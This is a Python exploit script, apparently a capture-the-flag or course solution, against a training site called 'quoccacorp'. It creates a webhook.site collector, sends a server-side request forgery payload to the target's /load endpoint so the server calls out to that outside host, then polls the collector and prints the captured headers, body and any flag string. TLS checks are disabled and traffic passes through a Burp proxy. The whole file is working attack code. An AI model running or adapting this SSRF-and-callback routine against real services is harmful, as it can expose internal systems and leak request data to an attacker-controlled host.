import requests
import time
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

BASE_URL = "https://quocced-in.quoccacorp.com"

# Session proxied through Burp Suite
s = requests.session()
s.verify = False
s.proxies = {"https": "http://127.0.0.1:8080"}
s.headers.update({
    "Content-Type": "application/json",
    "Origin": BASE_URL,
    "Referer": f"{BASE_URL}/",
})

# Separate clean session for webhook.site API (no Burp proxy needed)
wh = requests.session()

def create_webhook():
    r = wh.post("https://webhook.site/token", json={
        "default_status": 200,
        "default_content": "OK",
        "default_content_type": "text/plain"
    })
    token = r.json()["uuid"]
    public_url = f"https://webhook.site/{token}"
    api_url = f"https://webhook.site/token/{token}/requests"
    return public_url, api_url

def find_flag(text):
    match = re.search(r'([A-Z0-9_]+\{[^}]+\})', text, re.IGNORECASE)
    if match:
        print(f"\n[!!!] FLAG FOUND: {match.group(0)}")
        return True
    return False

def main():
    print("[*] Creating webhook.site endpoint...")
    public_url, api_url = create_webhook()
    print(f"[*] Public URL: {public_url}")
    print(f"[*] View live at: https://webhook.site/#!/view/{public_url.split('/')[-1]}")

    print(f"[*] Sending SSRF payload to /load...")
    r = s.post(f"{BASE_URL}/load", json={"site": public_url})
    print(f"[*] /load response: {r.status_code} {r.text[:200]}")

    print("[*] Polling for callback from server...")
    for i in range(10):
        time.sleep(2)
        poll = wh.get(api_url)
        data = poll.json()
        if data.get("data"):
            req = data["data"][0]
            print(f"\n[+] Server called back!")
            print(f"    Method:  {req.get('method')}")
            print(f"    Headers: {req.get('headers')}")
            print(f"    Body:    {req.get('content')}")
            if not find_flag(str(req)):
                print("[*] No flag pattern found — dumping full request:")
                print(str(req))
            return
        print(f"  [{i+1}/10] Waiting...")

    print("[-] Server never called back.")
    print(f"    Check manually: https://webhook.site/#!/view/{public_url.split('/')[-1]}")

if __name__ == "__main__":
    main()